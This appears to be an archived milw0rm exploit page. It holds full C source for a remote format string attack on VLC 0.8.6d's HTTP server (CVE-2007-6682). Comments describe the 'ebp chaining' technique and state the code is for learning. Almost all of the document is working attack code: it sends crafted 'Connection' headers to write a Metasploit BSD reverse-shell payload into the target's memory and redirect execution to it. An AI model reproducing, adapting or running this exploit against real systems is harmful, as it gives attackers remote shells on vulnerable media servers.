<html><head><title>VLC 0.8.6d httpd_FileCallBack Remote Format String Exploit</title></head><pre>/* Epibite // bite since 1442
 * pown meme ta mamie
 */

/* Advisory from Luigi Auriemma
 * CVE-2007-6682 / format string in VideoLAN VLC 0.8.6d
 *
 * Description :
 * Format string vulnerability in the httpd_FileCallBack
 * function (network/httpd.c) in VideoLAN VLC 0.8.6d allows
 * remote attackers to execute arbitrary code via format
 * string specifiers in the Connection parameter.
 */

/* La faille n'a d'interet que dans un but d'apprentissage
 * d'une technique avance d'exploitation des chaines de
 * format.
 *
 * Toute la difficulte de l'exploitation est liee au fait
 * que la chaine de format se trouve dans un thread, et
 * la pile remplie avec des adresses du tas.
 * On est donc oblige d'utiliser la technique dite de
 * &quot;l'ebp chaining&quot;.
 *
 * On pardonnera le manque de proprete et de portabilite,
 * defauts qui sont expliques et corriges durant son
 * utilisation sur la plateforme de tutoriaux de
 * l'Epitech Security Laboratory.
 */

/* Traduction:
 * This is ugly and not cross plateform, use it for
 * learning purpose. (^-^)
 */

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;strings.h&gt;
#include &lt;unistd.h&gt;

#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;

int	connect_(char *, int);
void	exit_(int, char *);
char	*get_payload(unsigned short, unsigned short/* , unsigned short * */);
void	progressbar(void);
void	write_short(unsigned short, unsigned short);

#define REQUEST &quot;GET / HTTP/1.0\r\n&quot; \
                &quot;Connection: &quot;

/* Chaining ebp // FREEBSD8 - 0.8.6d :
 *
 *  (0xbf5fa838) -&gt; 0xbf5fafa8  // 12$  httpd_FileCallBack()
 *         _____________/
 *        /
 *  (0xbf5fafa8) -&gt; 0xbf5fafe8  // 488$ httpd_HostThread()
 *         _____________/
 *        /
 *  (0xbf5fafe8) -&gt; 0x00000000  // 504$ pthread_getprio()
 *
 *  (0xbfbee2b8) // (bf5f)e2b8 is an eip value
 *                  because we write short by short,
 *                  we've just have to write (bfbe)
 *                  in order to have the sc addr.
 *  (0xbf5fa83c) // An eip -&gt; 12$ + 4
 */

#define FIRST_EBP	12
#define SECOND_EBP	488
#define THIRD_EBP	504

#define FBSD8_ESP	( 0xbf5fa808 )
#define FBSD8_SCADDR	( 0xbfbee2b8 )

int		port;
char		*ip;

/* bsd_ia32_reverse - LHOST=127.0.0.1 LPORT=4321 Size=92 http://metasploit.com */
unsigned char	scode[] =
  &quot;\x33\xc9\x83\xe9\xef\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6c&quot;
  &quot;\x3c\x56\xcc\x83\xeb\xfc\xe2\xf4\x06\x5d\x0e\x55\x3e\x7e\x04\x8e&quot;
  &quot;\x3e\x54\x29\xcc\x6c\x3d\x9b\x4c\x04\x2c\x54\xdc\x8d\xb5\xb7\xa6&quot;
  &quot;\x7c\x6d\x06\x9d\xfb\x56\x34\x94\xa1\xbc\x3c\xce\x35\x8c\x0c\x9d&quot;
  &quot;\x3b\x6d\x9b\x4c\x25\x45\xa0\x9c\x04\x13\x79\xbf\x04\x54\x79\xae&quot;
  &quot;\x05\x52\xdf\x2f\x3c\x68\x05\x9f\xdc\x07\x9b\x4c&quot;;

int			main(int argc, char **argv)
{
  unsigned int		i;

  if (argc &lt; 3)
    (void) exit_(1, &quot;Usage: exploit ip port\n&quot;);
  ip = argv[1];
  port = atoi(argv[2]);
  printf(&quot;[+] Victim is : %s:%d...\n&quot;, ip, port);
  printf(&quot;[+] Shellcode size : %d // located at : 0x%08x\n&quot;,
	 strlen((char *)scode), FBSD8_SCADDR);
  printf(&quot;[+] EIP is located at : 0x%08x\n&quot;, FBSD8_ESP + FIRST_EBP * 4 + 4 + 2);

  (void) write_short((unsigned short)(FBSD8_ESP + (THIRD_EBP * 4) + 2),
		     FIRST_EBP);
  (void) write_short((unsigned short)(FBSD8_SCADDR &gt;&gt; 16), SECOND_EBP);
  (void) write_short((unsigned short)(FBSD8_ESP + (THIRD_EBP * 4)),
		     FIRST_EBP);

  for (i = 0; i &lt; strlen((char*)scode); i += 2)
    {
      (void) write_short((unsigned short)(FBSD8_SCADDR + i), SECOND_EBP);
      (void) write_short((unsigned short)(*((unsigned short *)(scode + i))),
			 THIRD_EBP);
    }

  (void) write_short((unsigned short)(FBSD8_ESP + (THIRD_EBP * 4) + 2),
		     FIRST_EBP);
  (void) write_short((unsigned short)(FBSD8_ESP &gt;&gt; 16), SECOND_EBP);
  (void) write_short((unsigned short)(FBSD8_ESP + (THIRD_EBP * 4)), FIRST_EBP);
  (void) write_short((unsigned short)(FBSD8_ESP + FIRST_EBP * 4 + 4 + 2),
		     SECOND_EBP);
  (void) write_short((unsigned short)(FBSD8_SCADDR &gt;&gt; 16), THIRD_EBP);

  printf(&quot;[+] Done.\n&quot;);
  return (0);
}

char		*get_payload(unsigned short data,
			     unsigned short pop
			     /* unsigned short *offset */)
{
  static char	buffer[32];
  char		buffi[9];

  /* data = data - *offset; */
  if ((unsigned short)data &lt; 8)
    {
      memset(buffi, '0', 9);
      buffi[data] = '\0';
      sprintf(buffer, &quot;%s%%%d$hn&quot;, buffi, pop);
    }
  else
    sprintf(buffer, &quot;%%%du%%%d$hn&quot;, data, pop);
  /* *offset = *offset + data; */
  return (buffer);
}

void	write_short(unsigned short data, unsigned short pop)
{
  char	buff[1024];
  int	ret;
  int	sock;

  memset(buff, '\0', 42);
  strcat(buff, REQUEST);
  strcat(buff, get_payload(data, pop));
  strcat(buff, &quot;\r\n\r\n&quot;);
  sock = connect_(ip, port);
  if (write(sock, buff, strlen(buff)) &lt; (int)strlen(buff))
    (void) exit_(1, &quot;[-] write()\n&quot;);
  while ((ret = read(sock, buff, 1024)))
    ;
  if (close(sock) &lt; 0)
    (void) exit_(1, &quot;[-] close()\n&quot;);
  return ;
}

void	exit_(int i, char *tyop)
{
  write(2, tyop, strlen(tyop));
  (void) exit(i);
}

int			connect_(char *ip, int port)
{
  int			sock;
  struct sockaddr_in	s;

  (void) progressbar();
  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
    (void) exit_(1, &quot;[-] socket()\n&quot;);
  bzero(&amp;s, sizeof(s));
  s.sin_family = AF_INET;
  s.sin_port = htons(port);
  s.sin_addr.s_addr = inet_addr(ip);
  if (connect(sock, (struct sockaddr *)&amp;s, sizeof(s)) &lt; 0)
    (void) exit_(1, &quot;[-] connect()\n&quot;);
  return (sock);
}

void			progressbar(void)
{
  static unsigned int	c = 0;

  write(1, &quot;D       &quot;, 12
	- write(1, &quot;[?] 8=====&quot;, 5 + ((c &gt;&gt; 2 &amp; 1 ? -1 : 1)
				      * (++c &amp; 3)
				      + (c % 0x20 &amp; 100))));
  write(1, &quot;p0wn in progress&quot;, 19);
  write(1, &quot;...&quot;, c / 4 % 4);
  write(1, &quot;   \r&quot;, 4);
  return ;
}

// milw0rm.com [2008-04-28]</pre></html>